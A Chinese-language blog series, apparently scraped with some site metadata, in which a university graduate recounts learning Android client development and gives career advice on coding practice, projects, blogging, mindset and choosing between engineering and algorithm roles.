码量我觉得大学里的计算机学习，除了基础知识之外，第二重要的就是码量。写代码是一个程序员基本得不能再基本的东西，对于初学者来说，码量的积累是非常重要的，这决定了在毕业时你能否成为一名合格甚至优秀的工程师。 看书学习是一个非常理论的过程，很多的东西只有在实际的编码中才能体会到，就算你把快速排序的算法描述看个几十遍以至于倒背如流，真正第一次写的时候十有八九还是会出错，毕竟书本教会你的更多的还是理念和思想，而没有一本书会教你“如何把代码写出来”和“代码写出来出了问题该怎么解决”，而解决这两个问题，即提高工程能力的终极办法还是多写代码。 只有开始写代码的时候才会发现一些自己理解上的错误，因为计算机不会骗人，运行结果永远反应了实际的代码行为，当代码与自己的预期不符时，一定存在着自己的逻辑错误，这是很好的反馈与纠错的过程，把代码当成自己的老师，用自己的代码去验证自己的理解，是非常有效且正确的方法。 所谓代码写得好，比较直观的，一方面是说写的代码不容易出错，另一方面则是出错时能很快的解决，这样的能力几乎就是和码量成正比的。代码写的越多，出的错误也越多，解决的问题也就越多，而解决问题的方法和避免问题的习惯就是在这样的过程中养成的。 所谓久病成医，当很多次解决一个问题或者一类的问题时，会引导我们去思考其中的原因，而直接暴露出来的问题往往是表层的，越是复杂和容易出现的问题往往有着更加深层次的原因，可能是架构设计的问题、可能是对系统行为理解不当、又或者是编码习惯问题，探寻并改进这些深层次问题的过程是可以对自己产生非常大的提升的。 举个例子，当你发现自己的类用起来总是很别扭，经常需要改动很多代码才能实现一个新的功能时、或是代码逻辑混乱，数据状态各种出错时，自然而然地就会去了解到面向对象设计的一些非常实用的理念和设计模式这一类专门解决这些设计问题的方法，并很快可以通过应用它们来改进自己的代码，从而达到对这些理论的理解。离开了代码和实际的场景，理解这些概念和抽象往往是非常困难的，这也是学习过程中经常会遇到的，只能通过不断编码和练习解决的问题。 不同人在大学期间码量的差距也是极大的，记得我们学院书记曾对我们说过你们都应该给自己一个目标：“大学期间赚两万块钱，写两万行代码”，三年多下来给我的感觉是能赚到两万块钱的人比能写两万行代码的人还要多得多，而且能写到两万行以上代码的人往往赚得远远不止两万块了……（各种项目、外包、实习工资等），学院课程大部分人四年下来除去毕设会写的代码应该两万行不到，很多人毕设的工作量甚至也在一千行以内，而我了解了一下团队成员四年下来码量都会在十万行以上，这样巨大的差距直接导致了工程能力上的差异。 那么应该如何保证自己的码量呢，这里不建议刷LeetCode这种算法题来提高码量，算法能力不等于工程能力，其实积累码量的过程就是实践的过程，而在大学中这样的实践机会是很多的。 项目、外包与比赛在学校里最能接触到的实践机会大多是项目、外包与比赛这三种，经常会有各种各样的渠道找上来的项目，或者直接一点的外包，也有很多的比赛的宣传。建议是把这些作为实践的契机，同时也要注意辨别，判断付出的时间和回报是否值得。 我大学中接到的第一个项目（除了团队的新人任务外），是在刚入学三个月的时候，学院的辅导员找到团队的学长和我，问要不要接一个公司的项目做。当时我是很诧异的，为什么会有人让刚入学三个月的新生来做这样的项目。不过当时我倒是没有什么犹豫，因为和当初犹豫要不要报名联创团队时一个学长点醒我的那句话一样“报名不要钱，你又不会亏，为什么不试试呢？”。其实这就是大学中做项目、外包这些事的优势：试错的成本出奇地低，假如没有完成或者对方不满意的话，我们也不用承担任何责任和损失，而从中获取到的项目经验和码量的积累是实实在在的。后面这个项目其实完成的质量远远达不到公司的要求，但是对方还是支付了我们5000块的报酬，这也是我大学里赚到的第一笔钱。 其实除了积累码量、赚一些钱外，项目经历对于工程岗的求职来说也是很大的加分项，我在大学中大大小小的项目做了有十几个，简历给面试官留下的第一印象还是很深刻的。 大学中的项目来源有几种： 企业为了加强和学校的联系和合作（其实也就是希望吸引更多的毕业生到公司去工作），专门为学生设计的项目。这些项目可能是公司已经实现的东西，或者是比较边缘没有人力来支持的技术点，很少会有公司真正急需的东西来给到在校学生来做（这种一般直接外包了）。这类项目的技术要求最低，只要做的东西还过的去就会有一些报酬，一些比较重视的公司还会邀请你去参观公司，配备公司里的导师作交流等等。建议在大一大二时间比较宽裕，其他项目机会也比较少的情况下多接触这种项目，对上手做项目、开拓眼界等还是很有帮助的，也不用太考虑技术栈和自己方向是否匹配的问题，毕竟项目难度不会太大，了解一下其他技术也是很好的。 自己想做/团队想一起做的项目。这类项目一般是自己或者团队里的其他人出于兴趣，想去实现某个东西，比如团队之前有做过微博的第三方客户端、520的表白墙、团队的BBS，甚至是为了Linux能够认证校园网而诞生的mentohust。这类项目其实是最推荐去做的，因为自己的项目不用受什么限制，可以实现很多自己的想法和尝试技术。但是这里要强调一定是自己感兴趣的，因为这种项目没有金钱的回报，也没有其他人的约束，能不能做下去全靠自己的兴趣，只有真正投入进去才能把这种项目做好。我大学中最引以为傲的项目就是学长拉我一起做的一个用于生成带字幕的Gif图表情包的APP“表情锅”（原型是一个网站，诞生了“为所欲为”等一系列表情包，学长和作者认识）。当时我们两个人开发了两三个月的时间，基本上所有的空闲时间都投入在上面了。当然收获也很多，技术上按自己的想法完全使用Kotlin来开发、深度使用RxJava、接触交叉编译等，学到了很多新东西；产品上把应用上架后收获了几十万的下载量，也得到了很多认可。大学中如果有机会去实现自己想做的一些事情，就大胆地尝试吧。 自行申报的学院项目。在华科每年学院会有大学生创新项目的申报，这种建议是把上一条里面自己做的项目进行申报，可以报销一些经费什么的。 外包项目。这个就水比较深了，来源的渠道各种各样，有各种朋友介绍的、老师联系的甚至还有寝室楼下贴小广告的……因为市场中的外包公司的报价会比较高，而给学生出的价钱就可以低很多，所以有些公司就会打起大学生的主意，甚至还有专门从外面接项目然后包给学生做的“二道贩子”。所以在遇到这种项目的时候首先要看看项目的甲方是否可靠；再就是做的东西是否对自己的技术成长有帮助，主要还是看技术栈是否符合自己的方向，毕竟这种项目一般就是要做完整的软件或是APP了，需要投入的精力还是很多的，如果不是自己想做的方向如果没做好那就连技术经验都积累不了了；最后还要衡量一下工作量和报酬的关系，接触到的比较靠谱的外包基本上一天不会低于500，如果发现对方不断增加工作或者不想付出应给的钱的话，还是果断退出为好，相同的时间做一些自己想做的项目对技术成长更有帮助，光是为了赚钱没必要。 最后就是比赛了，各种面向大学生的比赛还是非常推荐参加的，一般都是比较好的与他人合作、交流的机会，在技术上也可以有很多成长，像是hackday这种一天内开发项目的比赛，基本上一天能写到十几个小时、几千行的代码。也可以在参加一些比赛的时候顺便做一些自己想做的项目，我大二参加学校的手机应用设计比赛时就从团队拉了一个产品和设计，然后一个人肝了两周的时间写了个相机类的APP，最后拿到了冠军，后来这个应用也成为了我的第一个上架应用。 总的来说，大学里做项目、参加比赛的试错成本真的很低，关键是对自己的技术成长和视野有没有帮助，如果发现项目/比赛是个坑，也可以尽早跳出来。我完整做下来出结果的项目其实也不多，更多的是发现这事不靠谱就鸽了，只要多尝试，被坑多了也就明白了，总会有靠谱的项目的，而这个过程收获的是实实在在的实践经验和码量，这才是最重要的。 技术博客团队成员必做的第0期任务里还有最后一点没有谈过，就是搭建自己的技术博客，为什么要有自己的技术博客呢？其实写博客更多的是给自己总结，其实和做笔记一个道理，把学习的一些东西做个记录和积累，一些比较难和有深度的东西，如果不及时地记录和总结，很有可能一段时间以后自己就忘了。 所以我博客里大部分内容还是实验的报告（在做完实验以后从头梳理了一遍实验的过程，加深印象和理解）、Android源码的分析（这些如果不记录下来，需要的时候再去翻源码效率太低了）和一些技术点的分析，如果能用文字把这些东西讲清楚，就说明是真的理解了。这些东西后来自己写代码想不起来的时候还会自己打开翻翻，到了面试前也会再拿来复习，好记性不如烂笔头的道理在技术学习上也一样适用。 另一方面，和做笔记不同的是，博客是公开的、可以被搜索到的，写博客不但是自己的积累，也是一种分享，很多自己分析源码的时候也搜不到相关的资料，这种原创的内容是可以为他人产生价值的。我之前也没想到自己重装5、6次以后写的Arch Linux安装教程后来会有十几万的访问量，也时常有人留言、发邮件表示感谢，会由衷地感到开心，这个时候才发现其实分享能带来的价值远远超乎我的想象。这几篇文章也算是一些更加大胆的尝试，希望能产生更多的价值。 最后，比较功利的角度，有原创的技术博客在简历上一定是加分项，因为会去总结技术、分享技术的人通常也会是热爱技术的，比较上心的面试官会提前看看博客，也是了解技术能力和热情的一个窗口，我在大二能面过头条很大原因就是博客上的文章得到了面试官的认可。 上架应用/上线项目上架应用/上线项目其实代表的是真正可以被用户使用的项目，因为一个项目真正有人用才是有价值的，上线和上架意味着这是一个完整的产品，要进行迭代，对用户负责，这和课内做的项目或是一些企业给的项目还是有很大的区别的。因此自己做的项目还是要尽力保证质量，想办法上线运营并进行迭代，把项目做完善才能发挥它最大的价值。 心态前文介绍了很多方法性质的东西，但经历过高三的同学应该都清楚，心态也是成长过程中需要重视的另一方面。 对技术保持敬畏心——切忌自我膨胀学计算机会很容易让人产生成就感，解决一个bug、完成一个功能、实现一个trick，都会让人体验到很强的满足感，这样的反馈是很多人喜欢上编程的原因，但一些人会把这样的成就感变为自己的优越感，会刻意去吹捧一些自己完成了但是别人没完成的东西，在和别人比较后觉得自己掌握了很多东西已经足够了，从而固步自封，对技术浅尝辄止。 正如前面所说的，任何一个方向都不可能在四年内达到精通的水平，不对技术保持敬畏心有弊无利，因为盲目自大而止步不前更令人惋惜。 直面困难，保持耐心一个比较有意思的事情是，计算机水平比较高的人脾气一般也会比较好，因为学计算机没有足够的耐性不太容易学好。 还是拿我大一入学装Arch Linux的经历来讲，因为显卡的原因，装完以后一直不正常，那些天每天强制重启电脑几十次，想了各种办法，换不同版本的包、调整配置，一旦调炸了又是几十分钟的重装过程，崩溃的时候真的会想砸电脑。最后折腾两个礼拜以后终于能开机使用了，但是外接显示器还是不正常，又是配置了一个礼拜，重装几次后搞定了。如果没有耐性和毅力，我想不可能能把Linux装好。 这其实更像是考验，经历过这样的过程更让人能体会到保持耐心、不轻言放弃的重要性。新人大多会遇到配置环境的种种问题、一个Bug解一天的情况，因为解决问题的方法与能力没有太多的积累，往往在开始会遇到比较大的困难，甚至觉得问题不可能解决从而放弃继续下去，其实这些都是非常正常的，每个人都会遇到的，而直面困难坚持下去才可能有后面的成长。 自信与勇气，大胆跨出第一步自信不是自大，而是在碰到机会时勇敢尝试的信心。在大一刚入学的时候其实我对自己的自信是远远不够的，记得当时联创团队来招新的时候我看着传单上的要求就几乎被劝退了，当时想的是自己什么都不会，团队招人要求又这么高，我肯定没机会。这样想法我后来在与学弟们的交流过程中其实听过很多很多次，很多人会觉得自己现在水平不够，想自己学一段时间后再报名，但是最好的机会往往就是这么被错过的。 万幸的是，当时到了报名的最后一天，我问了当时的班导师（大四学长），他的话我至今记忆犹新：“报名又不要钱，为什么不试试呢？你又不会亏。”。虽然比较直白，但是道理确实如此，我们没必要给自己设限，大学中做尝试的成本这么低，为何不试试呢？ 后来的故事当时就觉得像做梦一样，面试出乎意料地顺利，自己在国庆假期学了整整一个礼拜的Java和Android最后以第一的成绩通过了熬测，如愿以偿加入了团队，才有了后面的故事。很多时候会想起当时如果因为胆怯没有报名团队，现在又会是什么样子呢？不敢多想，但是这让我在后面的大学生活中又做出了不少正确的决定。 大二上学期要结束时，偶然看到团队群里有学长发布的深圳头条急招客户端实习生的消息，当时其实对自己的技术水平并没有太多的把握，但还是抱着“试试肯定没错”的心态铁着头写了份简历推了过去，然后就被安排了人生的第一次面试，却也出乎意料地跟面试官格外聊得来（甚至聊到忘记做笔试），后面的Leader面感觉也非常好（至今还觉得是面试体验最好的一次），面完以后就觉得自己可能可以去实习了。然后在某一天的上午，在寝室床上收到了offer call，一如加入联创时的梦幻，但是这次是实实在在的勇气换回来的。 有时候最困难的，就是跨出尝试的第一步。 技术之外的个人成长这篇文章的前面部分讲的几乎都是关于技术的东西，虽然技术能力对于一名计算机专业的学生来说很重要，但个人成长包含的方面太多太多，技术并不能代表一切，更不能决定一切。 最显著的一点，到了真正去公司实习，走向工作岗位的时候，会发现开发的工作并不只是每天闷头写代码，而是需要花一大部分时间在与其他人的沟通上，与产品沟通需求、与设计沟通交互、与同事沟通方案，乃至大部分公司的绩效/晋升还需要进行沟通和答辩。 因此，沟通能力会在很大程度上影响一个人的发展，功利地说，面试中很大一部分也是在考察候选人的沟通能力，身边也有很多技术能力足够，但是因为面试沟通能力不足而没有通过的例子。所以有时候在团队里，比起闷头写代码，我更鼓励大家多聊天聚餐活动。 而沟通能力也只是个人成长这个庞大的话题中的很小一部分，这些所谓的“软素质”并不是通过一些方法或者经验就可以快速提升的，对这些内容我自己也正走在路上，所以也不再赘述了。在这里想表达的是千万不要把提升技术当成成长中唯一需要关注的事情，在大学里可以做的很多事情会比学习技术更加有意义。 我大学中绝大多数的时间都放在了技术上，除去大一参加了学生会、当了一年半班长之外，剩下的时间就是团队、公司和宿舍三点一线了，这样的大学生活我想不是大多数人所期待的，但回忆起大学中最值得开心的事情，并不是技术做得多好或拿了多少Offer，而是和队友们一起合作和成长的过程；也不是得到了多少荣誉或赚到了多少钱，而是靠着自己赚的钱带女朋友一起去了很多地方。真正的快乐，来自于技术为我们创造的价值。 最后的最后，还是要强调一下“身体是革命的本钱”这句话，身体的健康是这一切的一切的前提，失去了健康意味着人生就此变换了方向，以前做的大部分努力都将付之一炬，这是绝大部分人所承受不起的。 知易行难，与君共勉。 这是全文的第二部分，介绍了如何在大学阶段学习计算机并获得快速的技术成长。在下一篇文章中，将主要介绍一些实习/工作相关的内容和面试的经验。 如果以上的内容对你有所帮助，欢迎你把它分享给更多人，谢谢！ 如果有任何想法、疑问、意见或是建议，欢迎关注公众号VirMe留言交流。 从开始到微信/支付宝/Airbnb/抖音Offer——我的大学客户端开发学习之路（一）开始——步入大学生活 从开始到微信/支付宝/Airbnb/抖音Offer——我的大学客户端开发学习之路（二）过程——技术学习与个人成长","tags":[{"name":"Summary","slug":"Summary","permalink":"https://www.viseator.com/tags/Summary/"}]},{"title":"从开始到微信/支付宝/Airbnb/抖音Offer——我的大学客户端开发学习之路（一）开始——步入大学生活","date":"2020-05-24T02:30:32.000Z","path":"2020/05/24/university_1/","text":"写在前面首先原谅我用这样的标题来博得关注和点击，因为思前想后也只有我所拿到的Offer才最能在一定程度上代表能力，为我下面将要分享的内容作背书。 在最开始准备写这篇文章的时候只是想像往常那样放在我的博客上作为自己的回忆和总结，不太想去获得别人的关注；但另一个声音告诉我这些东西和之前的技术文章不太一样，这些经验和教训可能可以帮助到很多刚刚踏入校门的新人们，或多或少地产生一些价值。 既然决定了写这篇文章是为了创造价值，那么只有分享出来，让更多感兴趣的人看到才能创造更多的价值，这就是此时此刻你能看到这篇文章的原因。 由于文章的篇幅已经远超最初的预想，所以会拆成几篇分别在微信公众号VirMe发出（确实是公众号最适合创作与分享，还烦请关注），所有文章共用开头部分，特此说明。 个人介绍笔者2016年高考考入华中科技大学计算机科学与技术专业，同年10月份加入学生技术团队联创团队Android组，后任组长。 2017年底（大二寒假）拿到今日头条（字节跳动）深圳研发中心Android开发实习生Offer，在深圳研发中心实习至2018年3月。 2018年4月加入新成立的今日头条武汉研发中心实习，2019年5月离职。 2019年春招拿到腾讯（微信）、蚂蚁金服（支付宝）、Airbnb的暑期实习Offer，2019年7月加入微信实习。 2019年秋招拿到字节跳动SSP（抖音）、微信***（转正）、猿辅导SP（斑马英语）校招Offer，最终选择留在微信，目前仍实习在职。 在我的大学四年中，有四年的Android开发经历，两年半的实习经历，有两款Google Play上架的应用，个人原创技术博客也收获了25w+的访问量，当然，最重要的是最后拿到了自己满意的Offer，也算是给大学生活画上一个比较完整的句号了。 文章目的上面介绍的经历并不是为了显示我的经历有多牛逼，事实上在我认识的范围内我的经历还远远谈不上出彩。当我刚刚考入大学，进入我心仪的计算机专业时，觉得提升自己的技术、加入BAT这样的大厂就是我的目标，这也由此指引了我大学生活的方向。相信很多无论是不是刚入学的新生、也无论是不是计算机专业，都有着像我那时的想法。很幸运的是我在非典型的大学四年中找对了方向，也找到了方法，收获了很多的经验与教训，最终达到甚至稍稍超出了自己当初的立下那个目标。 现在回想起来，这很大程度上要归功于给我提出建议、给我指引的前辈们，没有前人的经验我们很难找到正确的方向与方法，以至于陷入无谓的迷茫与焦虑之中。当然在这过程中，也从自己的经历中认识到很多“假如我早点知道该多好”的问题。我所在的华中科技大学联创团队（学生技术团队）有着近20年的历史积累，通过前辈的方法与经验的传承，近年就业的队员几乎是人手几家大厂SP Offer，我想这些方法与经验应该是行之有效的，也是值得与大家分享的。 我写这篇文章的目的也正是在此，一是为了总结自己的大学四年；二是给有着和我一样的目标的同学们一些参考和建议（包括对应届生比较实用的面经），希望可以给读到这篇文章你们一些帮助，希望你们也可以达到自己的目标或是在追求更高的目标的路上更进一步，也算是作出一些微小的贡献；三也是为了帮助大家更好地认识客户端开发这个现在普遍认识不足却有着极大缺口的方向，也是给我所在的联创团队、微信团队打打广告。 虽然文章标题写的是客户端开发之路，但是文中80%以上的内容都是对于技术学习方向比较通用的内容；同时，本文主要面向毕业直接工作的同学，所以不会涉及到读研、出国相关的内容。 最后，本文表达的内容都是一些自己的看法，也仅代表个人的观点，受文笔和经验所限，表达不当之处敬请包涵，也恳请经验更加丰富的前辈多多指正。 正文大学四年的经历很长，总归不是三言两语就能表达清楚的，每个人所处的阶段不同可能感兴趣的内容也不同，为了保证阅读体验，会主要分为三篇文章（非通用内容和一些书籍推荐等会后面另行发出）： 对刚进入大学、想要在未来从事开发工作的大一大二新生的一些建议: 从开始到微信/支付宝/Airbnb/抖音Offer——我的大学客户端开发学习之路（一）开始——步入大学生活 如何在大学阶段学习计算机并获得快速的技术成长 从开始到微信/支付宝/Airbnb/抖音Offer——我的大学客户端开发学习之路（二）过程——技术学习与个人成长 关于实习；如何准备面试、在面试中展现自己以及最终的选择 本文是其中的第一篇，其他文章敬请关注公众号VirMe。 （一）开始——步入大学生活为什么选择计算机专业？这是我经常问刚进入计算机系，或是面试联创团队（下称团队）的学弟学妹们的一个问题。我听到的答案其实大概有如下几种： 父母让我选择计算机专业 我觉得当下学计算机就业轻松，并且收入不错 我喜欢玩电脑、打游戏，对计算机感兴趣 我有过编程经验，我喜欢编程 这四个答案可以分为两类，一类是有强烈的外在驱动：当下风口、就业前景、收入水平；另一类则是自己的自驱力：我想要学。 确实，当下的计算机行业，在一阵阵的热潮之中，一直处于人才供不应求的阶段，由此也带来了相对较高的收益，在这样的背景下，计算机专业的录取分数线也水涨船高，在很多省份的录取分数已经超过了华科最王牌的机械、光电专业。我高考时619分就能进的计算机，三年后学弟的录取分数却高达650。不得不说这是一些家长和同学的功利心理导致的。但现实是残酷的，在被我问过这个问题的同学中，往往答案是后两种的同学最终进了团队，在技术上早早地取得优势，在能力上也远远超出了其他同学。 背后的原因其实很明显，大学的专业本来就是为了满足不同人发挥不同的兴趣特长而设立的，而在逐利的背景下，大批怀揣着高薪梦想，觉得录取到计算机专业就高枕无忧的同学涌入，殊不知就算是华科的计算机系，每年都会有不少的同学因为不能完成基本的课业而被退学，到了大四面临着无法按时毕业，在招聘季为了一份工作焦头烂额，更是有80%以上的同学本科毕业时甚至写不出一个没Bug的快速排序。 行业决定下限，这句话不假，只要你在大学四年中认真完成所有学校设立的课程，完成学业后可以比较轻松地找到一份“还算不错”的工作（华为每年都会在华科统一价批发走一大批学生），薪资也可以轻松超过绝大多数其他专业的同届同学。但是这并不代表不用付出相应的努力，计算机是一门知识非常系统的学科，也是一门学习曲线一开始较为陡峭的学科，这意味着从一开始就需要付出很大努力并且短期内很难看到直接的收益，从基础的数据结构、算法、C语言学起，对于一个刚接触计算机科学的新人来说无不是抽象且晦涩的，在我刚开始学习它们的很长一段时间里我都会问自己这些东西有什么用，为什么我写的程序只能在终端里面输出一些字符，怎么才能写出那种有界面能用的软件呢？事实上这些知识的作用在一段时间后才会体现出来，例如当需要自己使用C语言实现操作系统的一部分、需要理解操作系统线程调度算法、需要设计编译原理的抽象语法树时，没有前置的技术积累将会使得后续知识的学习变得寸步难行。 有很大一部分同学在真正开始学习计算机时并没有意识到这一点，在刚进入大学失去外在的束缚并且时间较为宽裕的情况下，没有付出足够的时间在这些基础的较为枯燥的课程上，导致在后面的课程中处处碰壁，使得没有完全掌握的内容越来越多，最终自暴自弃，失去了在宝贵的大学四年中更加深入地学习这些通用课程的机会。 而能支撑我们从一开始学习看似枯燥的知识到后面持续不断的付出与深入的，很多时候只有自己的自驱力，因为我喜欢计算机，才会心甘情愿付出比别人多几倍的时间；才会在别人翘课、游戏、参加各种活动的时候静下心来对着屏幕上的字符；才会在遇到一个又一个Bug的时候花上几个小时的时间去调试。这样的自驱力对于计算机的学习至关重要。 对我而言，在小学的时候因为数学好，被选去参加NOIP（信息学技术竞赛），那时候还是写的BASIC语言，虽然初中后因为县城的条件，没有再继续下去，但这段经历让我意识到什么是我真正热爱的、愿意付出自己所有的热情去做的事情。所以在高考成绩出来以后，不用十分钟我就确认了自己的志愿：华科的计算机、信安与软件。回想起来，就算一开始遇到了很多困难（大一的时候光是装Linux就装了两个礼拜……），也从来没有想过放弃，靠着兴趣确实做成了很多事情。 事实上，有着计算机兴趣并成功考入计算机专业的人是幸运的少数，对于自身没有多大兴趣又想毕业时拿到头部企业的高薪Offer的同学，我觉得对于功利的追求不会让一个人走得太远，但是兴趣是可以培养的，任何一门学科学到深入都是充满魅力的，尤其是计算机这种非常容易取得满足与成就感的学科（当然这点也不尽然是好事，后续文章会谈）。我相信任何一个有志于从事这个行业的同学都可以在不断深入的过程中找到自己的乐趣。 科班与非科班在接触到的很多想加入团队或是想应聘头条或是腾讯的同学中，有不少不是计算机专业的，也就是所谓的非科班，他们常问的一个问题是，非科班的身份会不会对找工作有很大的影响？其实这个问题和另一个热门问题很相似：如何看待培训班培养出来的程序员。 在我看来，科班或者非科班就像985、211一样，都是一个人身上的tag，它们常被人用作评判一个人的标准之一，在没有其他任何可以参考的信息时，这些tag就成了衡量个人水平的唯一标准。但计算机的情况并非如此，在评判一个人能否胜任工作岗位时，这些tag的影响力远不如实实在在的实习经验和项目经验，这些项目往往能体现一个人的真实能力，而技术面试可以很容易判断作假的经历与项目。但在技术面试中，还有更重要的一部分，也是科班与非科班最容易体现出的区别。 前面说过，基础知识的积累决定了后续知识的学习能力，而科班则提供了从底层开始向上扩展的课程体系（虽然不尽完善与及时），但培训班和一些非科班同学则将重点放在了最上层和浅显的知识学习，也就是工作中直接接触，可以直接创造价值的那部分。因为在有限的时间内，对于这些知识的快速学习是最有助于看到成效和容易被接受的。把这部分知识学好了，能不能干活呢？或许可以，但是很少有没有系统的计算机知识的人可以深入到问题的背后探究其本质，这也是我们常自嘲“面向StackOverFlow/Github编程”和“Copy&amp;Paste工程师”真正所指的那批人。急功近利的后果是程序运作基本原理知识的缺失、是分析与解决根源问题的能力的缺失、是分析与设计复杂系统的潜力的缺失等等，最重要的是失去了底层能力的积累也就失去了进一步深入学习的基本能力，导致在技术道路上的停滞不前。 任何有过比较深入的编程经验的程序员都深知基础知识对于从业者的重要性，它在一定程度上代表了一个程序员的潜力与未来，这是为什么各个大厂的招聘要求与面试中都有着对基础知识的考察，非科班同学比较容易缺失的这点就成了就业中的劣势，也造成了一部分公司与面试官的成见。那么非科班的同学是不是就一定没机会与科班同学竞争了呢？绝对不是，但往往需要付出更多。除了需要自学与科班同学相同的基础知识之外，为了顺利毕业也要同时保证本学科的课程可以顺利过关，同时没有合理的安排、教师的指导与考试的束缚，非科班的同学需要更强的自驱力来克服上述的这些困难。 不过，我所认识的非科班的同学（也大都是团队的）最后体现出的能力与结果却都远远强于科班的大部分同学。微信同组有高我一届的船海学院学长大三暑假去了腾讯IEG的游戏引擎组实习，秋招又通过四轮面试加入了微信团队；和我大二一起拿到深圳头条实习Offer的同学是电信学院的；团队同组的机械学院同学大三加入了武汉头条，还从Android开发转到了iOS开发……这样的例子数不胜数，甚至我这届的团队队长也是所谓非科班的。我想，正如上一节所说的那样，也正是非科班的身份和强大的兴趣支持他们不断地付出更多的努力，最终走上了自己想要的路。 路线选择（工作/读研/出国）本科的同学都会面临这样的问题，在四年本科结束以后，该做什么？这个问题对于计算机专业的同学，可能更加困难。相对于其他专业，计算机同学工作和出国的比例会更高一些，以华科为例，每年计院+软院选择工作、读研和出国的毕业生比例大概为5:3:2。在这里不过多分析各个方向的优劣，每个人的情况不同，也没有任何一个方向会比其他两个有明显的优势，每个人的选择都需要结合自身的情况做出选择，也需要为自己的选择负责，因为每个选择都意味着得与失，每个人想要的生活不同，参考别人的选择并无多大意义，更加值得参考的是选择背后的逻辑。 例如，对于对移动客户端、前端Web这些偏工程类的方向感兴趣的同学，毕业直接工作两年带来的经验和薪资收益通常会优于读研所带来的收益；对图形学、人工智能等科研性质浓厚的方向感兴趣或是想毕业后从教的同学读研几乎是必须的选择。 在这里想说的重点不是如何选择，而是要尽早作出选择。不同的选择努力的方向在很大程度上并不相通，读研的同学需要保证到课率、高质量完成作业和刷题备考以保证绩点可以排在年级前列；出国的同学需要提升语言能力以及科研经历；工作的同学则需要深入学习一个方向的技术、丰富自己的项目与实习经历。 因为时间是有限的，极少的人可以做到同时兼顾课内成绩在年级前列的同时深入学习一个方向的知识并有着丰富的项目/比赛经验，更不用说长时间的在外实习（当然我也认识几位传说级的学长做到了这些）。假设花费同样的精力可以在两个方向上做到90分+90分或是60分+120分，但当真正毕业走向一条道路时，120分所带来的收益会远超于90分。 非常现实的例子是，如果选择读研，花费大量时间完成的项目不会比提升成绩排名更有利于申请学校；反之，如果毕业时选择的是工作，那么加权平均成绩是90分或是60分不会有任何区别，但达到90分花费的精力会是60分的数倍（这里决不是说课内成绩无关紧要，后续文章再谈），把时间用在实习或是做项目上会更有利于找到一份好的工作。 尽早地做出选择，意味着往后的大部分时间分配将会更有目的性，也避免了无谓的迷茫与焦虑，总的来说，就是专注地做一件事情，并把这件事情做到极致。 以我为例，因为比较厌倦应试，也没有出国的经济条件，所以几乎是在刚进入大学时就决定了毕业就工作这条路，所以大学的绝大多数时间都花在了基础知识和Android开发上，也正是由于非常专注与大量的时间投入，才能在大二找到一份难得的实习工作，慢慢走向正轨。当然，也付出了相应的代价，我的很多学校课程都是低分飘过（专业课例外，几乎都是85以上），所幸没有挂过科（这很重要），但这还是意味着我已经没有了任何退路：无法保研、考研，只有工作这唯一的路。 但也不是每个人都能很快地作出自己的选择的，这个时候的建议是在保证自己加权成绩的同时多去了解各个方向，大一的成绩对于最终能否保研至关重要，在作出决定之前要保证自己仍有选择的余地。最不利的情况就是前期没有想好自己想做什么，在课业上没有重视甚至挂科，导致早早失去保研的机会，也没有在技术上下功夫准备工作，到了大三才发现考研和就业都是难度极大，最终的出路也不会太好。 最后，再次强调没有任意一条路会来得更加轻松，就和前面为什么选择计算机的问题一样，只从功利的角度出发，通常走不太远，只有遵循自己的内心，付出相应的努力，才会有达到更高目标的可能。（再次再次说明，之后的内容只针对就业的同学） 技术方向选择在选择工作这个方向之后，马上要面临的一个问题是——我该学些什么呢？ 前文已经多次提到基础知识对于计算机从业者的重要性，如何学习基础知识这点会在后续文章单独讲，在这里想讲的是除开通用知识之外，在就业时通常需要选择一个特定的岗位，也就是需要我们对一个特定领域的知识有深入的了解。 为什么需要对一个方向深入了解呢？你可能听过一个高大上的词叫全栈工程师，指的是掌握多个领域技术，可以独立承担完整链路的开发工作的工程师，为什么不以成为全栈作为自己的技术方向呢？ 事实上，在短短的大学四年中，从零开始到完全掌握一个技术方向都不太可能，更不用说掌握多个技术方向了。我在大学里几乎从一开始就在学习Android开发的内容，三年的经验到了公司里还是会被一年工作经验的同事吊打，大量实际的开发经验和校园中能接触到的项目经验不可同日而语。计算机科学与技术是一门知识体系庞大，分支众多的学科，对于零基础的新人，学习基础知识已经需要花费大量的时间，大部分的毕业生也只能做到深入了解一个方向的知识。基于这一点，国内公司大都会设置不同方向的开发岗位，培养某一方向上的专家工程师。 那么应该怎样选择技术方向呢？首先记住一点：各个技术方向没有优劣之分，只是各有特点。 算法与工程但在选择方向这一问题上，有着很多因为不了解、功利心或是从众心理造成的现象。在我刚进入大学的2016年，如果抓住一个计算机的新生问“你对哪个方向比较感兴趣？”，听到的回答十有八九会是“算法”，因为在很多刚接触计算机的新人眼里，“算法”听上去是充满难度与挑战、十分重要且核心的计算机领域，加上算法工程师的薪资通常也会高出其他岗位，它自然就成了很多人的理想出路；但他们没有看到的是，对很多人来说，算法的学习过程是十分枯燥无趣的，也需要有一定的数学基础和抽象思维能力，不是每个人都适合这样的学习路线，很多人兴致勃勃买了《算法导论》，但到毕业时却不曾读完一遍，这就是不了解和功利心带来的困境。 到了近两年，随着人工智能的火热，新生的回答更多的变成了“想学人工智能”，同样的原因，只不过来得更加猛烈。但对于人工智能的学习，只要稍作了解，就会知道人工智能技术远没有想象的那样高大上，更不用说继续深造几乎是这一路线的唯一选择。 抛开上述问题，即使你在了解之后真的对算法和人工智能感兴趣，并且也能接受它们的学习路线，你还是会面临一个极大的问题——工程岗和算法岗供需关系的极度不平衡。 下面是2019秋招时一名资深HR的朋友圈比较直接地说明了这一问题，在这里分享给大家（已经找不到来源，如有侵权，请联系删除）： 图中提到了几个问题： 工程岗（客户端、前端、后台、游戏等）目前供不应求，尤其是客户端与前端，头条在19年更是为客户端专门设立了几万元的签字费、并放宽招聘要求到不要求有客户端开发经验以吸引学生投递，即使如此19年还是剩下了大量的工程岗hc没有招满，其他公司的情况也大致如此。这样的情况到了20年还是没有得到缓解，甚至愈演愈烈。 另一边，算法岗的情况却是严重的供过于求，有如千军万马过独木桥，比较靠前公司的算法岗更是神仙打架。 这样的结果其实在大家的认知与观念扭转过来之前是必然的。 算法岗的需求量相对于工程岗本来就相对较少，在加之近几年的移动互联网崛起，算法岗的需求没有增加多少，但工程岗尤其是客户端的需求却是猛增了好几倍。但大学中的大部分学生还是处于“把算法学好就肯定能找到好工作”的认知中，加之还有一部分学生因为没有一门深入的方向，就业时只能硬着头皮投递算法岗。 